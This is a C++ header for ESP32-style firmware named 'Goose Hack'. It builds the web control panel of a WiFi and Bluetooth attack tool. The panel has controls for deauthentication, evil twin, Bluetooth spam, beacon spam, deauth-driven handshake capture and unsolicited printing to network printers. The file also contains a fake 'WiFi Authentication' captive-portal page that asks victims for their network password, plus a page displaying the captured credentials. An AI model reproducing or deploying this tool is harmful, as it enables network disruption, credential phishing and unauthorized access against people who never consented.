#ifndef WEB_INTERFACE_H
#define WEB_INTERFACE_H

#include "config.h"

String targetSSID = "";
int targetChannel = 0;
uint8_t targetBSSID[6];
bool attackActive = false;
bool evilActive = false;
bool sourAppleActive = false;
bool combinedActive = false;
bool windowsBluetoothActive = false;
bool handshakeCapture = false;
bool aggressiveHandshake = false;
unsigned long handshakeStartTime = 0;
bool handshakeComplete = false;
String capturedHandshakes = "";
uint32_t handshakeCount = 0;
volatile bool beaconSpamActive = false;
String validPass = "";
unsigned long lastAttackTime = 0;
unsigned long lastBeaconTime = 0;
uint32_t deauthPkts = 0;
uint16_t seqNum = 0;
std::vector<Station> stations;
uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
char emptySSID[32];
uint8_t channelIndex = 0;
uint8_t macAddr[6];
uint8_t wifi_channel = 1;
uint32_t packetSize = 0;
uint32_t packetCounter = 0;
DNSServer dnsServer;
WebServer webServer(80);
TaskHandle_t deauthTaskHandle = NULL;

#include "web_styles.h"

String input(const char* argName) {
  return webServer.arg(argName).substring(0, 50);
}

String htmlHeader(String title) {
  return "<!DOCTYPE html><html><head><title>" + title + "</title>"
         "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
         "<style>" + String(CSS) + "</style></head><body>";
}

String htmlFooter() {
  return "</body></html>";
}

String getEncryptionType(uint8_t type) {
  switch (type) {
    case WIFI_AUTH_OPEN: return "Open";
    case WIFI_AUTH_WEP: return "WEP";
    case WIFI_AUTH_WPA_PSK: return "WPA";
    case WIFI_AUTH_WPA2_PSK: return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/WPA2";
    default: return "Unknown";
  }
}

String macToString(const uint8_t* mac) {
  char buf[18];
  sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(buf);
}

String controlPanel() {
  WiFi.mode(WIFI_AP_STA);
  WiFi.scanDelete();
  int n = WiFi.scanNetworks(false, true, true, 150U);
  
  String html = htmlHeader("Goose Hack");
  html += "<div class=container>";
  html += "<div class=header><h1>GOOSE HACK</h1><p>WiFi Security Testing Platform</p></div>";
  
  html += "<div class=status>";
  html += "<div class=status-item><span class=status-label>Target:</span><span class=status-value>" + (targetSSID.length() > 0 ? targetSSID : "None") + "</span></div>";
  html += "<div class=status-item><span class=status-label>Channel:</span><span class=status-value>" + String(targetChannel) + "</span></div>";
  html += "<div class=status-item><span class=status-label>BSSID:</span><span class=status-value>" + (targetSSID.length() > 0 ? macToString(targetBSSID) : "None") + "</span></div>";
  html += "<div class=status-item><span class=status-label>Deauths:</span><span class=status-value>" + String(deauthPkts) + "</span></div>";
  html += "<div class=status-item><span class=status-label>Stations:</span><span class=status-value>" + String(stations.size()) + "</span></div>";
  html += "<div class=status-item><span class=status-label>Handshakes:</span><span class=status-value>" + String(handshakeCount) + "</span></div>";
  html += "<div class=status-item><span class=status-label>Captured:</span><span class=status-value>";
  html += (validPass.length() > 0) ? "Yes" : "None";
  html += "</span></div>";
  html += "</div>";
  
  html += "<div class=grid>";
  html += "<div class=card><h3>Target Selection</h3>";
  html += "<form action=/select method=post><div class=form-group><label>Available Networks</label><select name=ssid>";
  html += "<option value=''>Select Network</option>";
  for (int i = 0; i < n; i++) {
    if (WiFi.channel(i) <= 13) {
      html += "<option value=\"" + WiFi.SSID(i) + "\">" + WiFi.SSID(i) + " (Ch" + String(WiFi.channel(i)) + ", " + String(WiFi.RSSI(i)) + "dBm)</option>";
    }
  }
  html += "</select></div><button class='btn btn-primary'>Select Target</button></form>";
  html += "<form action=/rescan method=post><button class='btn btn-secondary'>Rescan Networks</button></form></div>";
  
  html += "<div class=card><h3>Attack Controls</h3><div class=attack-controls>";
  html += "<form action=/attack method=post><button class='btn ";
  html += attackActive ? "btn-danger'>Stop Deauth" : "btn-primary'>Start Deauth";
  html += "</button></form>";
  html += "<form action=/evil method=post><button class='btn ";
  html += evilActive ? "btn-danger'>Stop Evil Twin" : "btn-primary'>Start Evil Twin";
  html += "</button></form>";
  html += "<form action=/combined method=post><button class='btn ";
  html += combinedActive ? "btn-danger'>Stop Combined" : "btn-primary'>Start Combined";
  html += "</button></form>";
  html += "<form action=/sourapple method=post><button class='btn ";
  html += sourAppleActive ? "btn-danger'>Stop Sour Apple" : "btn-primary'>Start Sour Apple";
  html += "</button></form>";
  html += "<form action=/windowsbt method=post><button class='btn ";
  html += windowsBluetoothActive ? "btn-danger'>Stop Windows BT" : "btn-primary'>Start Windows BT";
  html += "</button></form>";
  html += "<form action=/printer method=post><button class='btn ";
  html += printerAttackActive ? "btn-danger'>Stop Printer Attack" : "btn-primary'>Printer Attack";
  html += "</button></form>";
  html += "</div></div></div>";
  
  html += "<div class=grid>";
  html += "<div class=card><h3>Beacon Spam</h3>";
  html += "<form action=/beaconspam method=post><button class='btn ";
  html += beaconSpamActive ? "btn-danger'>Stop Target Spam" : "btn-primary'>Target Spam";
  html += "</button></form>";
  html += "<form action=/custombeacon method=post><div class=form-group><label>Custom SSIDs (one per line)</label>";
  html += "<textarea name=ssids placeholder='WiFi-Guest\nFree-WiFi\nCoffee-Shop'>" + customSSIDs + "</textarea></div>";
  html += "<button class='btn ";
  html += beaconSpamActive ? "btn-danger'>Stop Custom Spam" : "btn-primary'>Custom Spam";
  html += "</button></form></div>";
  
  html += "<div class=card><h3>Management</h3>";
  html += "<form action=/handshake method=post><button class='btn ";
  html += handshakeCapture ? "btn-danger'>Stop Passive Capture" : "btn-primary'>Passive Handshake";
  html += "</button></form>";
  html += "<form action=/aggressive method=post><button class='btn ";
  html += aggressiveHandshake ? "btn-danger'>Stop Aggressive (80s)" : "btn-primary'>Aggressive Handshake (De)";
  html += "</button></form>";
  html += "<form action=/download method=post><button class='btn btn-secondary'>Download PCAP</button></form>";
  html += "<form action=/clearhs method=post><button class='btn btn-secondary'>Clear Handshakes</button></form>";
  html += "<form action=/viewpass method=post><button class='btn btn-secondary'>View Credentials</button></form>";
  html += "<form action=/changeap method=post><div class=form-group><label>AP SSID</label><input type=text name=ssid value='" + MAIN_SSID + "'></div>";
  html += "<div class=form-group><label>AP Password</label><input type=password name=pass value='" + MAIN_PASS + "'></div>";
  html += "<button class='btn btn-primary'>Update AP</button></form></div>";
  
  html += "<div class=card><h3>Network Printers</h3>";
  if (!WiFi.isConnected()) {
    html += "<div class=form-group><label>Connect to Network First:</label></div>";
    html += "<form action=/connectnet method=post><div class=form-group><label>Network SSID</label><input type=text name=ssid placeholder='Target-Network'></div>";
    html += "<div class=form-group><label>Password</label><input type=password name=pass placeholder='network-password'></div>";
    html += "<button class='btn btn-primary'>Connect to Network</button></form>";
  } else {
    String currentSSID = (WiFi.SSID().length() > 0) ? WiFi.SSID() : "Unknown";
    html += "<div class=form-group><label>Connected to: " + currentSSID + " (" + WiFi.localIP().toString() + ")</label></div>";
    html += "<form action=/scanprinters method=post><button class='btn btn-secondary'>Scan Network</button></form>";
    if (discoveredPrinters.length() > 0 && discoveredPrinters != "No printers found") {
      html += "<div class=form-group><label>Discovered Printers:</label><textarea readonly>" + discoveredPrinters + "</textarea></div>";
      html += "<form action=/printtest method=post><div class=form-group><label>Target IP</label><input type=text name=ip placeholder='192.168.1.100'></div>";
      html += "<div class=form-group><label>Message</label><input type=text name=msg value='Security Test - Unauthorized Access'></div>";
      html += "<button class='btn btn-warning'>Send Print Job</button></form>";
    } else if (discoveredPrinters.length() > 0) {
      html += "<p>" + discoveredPrinters + "</p>";
    }
    html += "<form action=/disconnect method=post><button class='btn btn-secondary'>Disconnect & Return to AP</button></form>";
  }
  html += "</div></div>";
  
  html += "</div>" + htmlFooter();
  return html;
}

String evilIndex(String error = "") {
  String html = htmlHeader("WiFi Authentication");
  html += "<div class=container><div style='max-width:400px;margin:50px auto;padding:30px;background:#1a1a2e;border-radius:12px;border:1px solid #16213e'>";
  html += "<h1 style='color:#00ff41;text-align:center;margin-bottom:20px;font-size:24px'>WiFi Authentication</h1>";
  if (error.length() > 0) html += "<div style='color:#ff4757;text-align:center;margin-bottom:15px;font-size:14px'>" + error + "</div>";
  html += "<form action=/post method=post><div class=form-group><label>Network Password</label>";
  html += "<input type=password name=m required placeholder='Enter WiFi password'></div>";
  html += "<button class='btn btn-primary'>Connect to Network</button></form>";
  html += "<div class=info>Please enter your WiFi credentials to access the network</div>";
  html += "</div></div>" + htmlFooter();
  return html;
}

String viewPasswordPage() {
  String html = htmlHeader("Captured Credentials");
  html += "<div class=container><div class=header><h1>CAPTURED CREDENTIALS</h1></div>";
  html += "<div class=card><h3>Saved Credentials</h3>";
  html += "<div class=status><div class=status-item><span class=status-label>Credential:</span><span class=status-value>" + (validPass.length() > 0 ? validPass : "None") + "</span></div></div>";
  html += "<form action=/clearpass method=post><button class='btn btn-danger'>Clear Password</button></form>";
  html += "<form action=/ method=post><button class='btn btn-secondary'>Back to Control Panel</button></form>";
  html += "</div></div>" + htmlFooter();
  return html;
}

void setupWebServer();

#endif
